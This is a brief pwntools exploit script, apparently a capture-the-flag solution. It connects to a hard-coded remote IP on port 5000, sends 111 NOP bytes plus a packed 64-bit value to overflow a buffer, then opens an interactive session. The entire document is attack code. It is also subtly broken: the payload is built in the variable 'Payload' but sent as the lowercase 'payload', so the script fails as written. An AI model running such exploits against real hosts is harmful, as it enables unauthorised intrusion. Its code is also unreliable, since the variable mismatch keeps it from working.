#!/usr/bin/python3
# Author : trustie_rity

from pwn import *

p = remote("159.223.7.179",5000)
Payload = b"\x90"*111
Payload += p64(0x4d)
p.sendline(payload)

p.interactive()
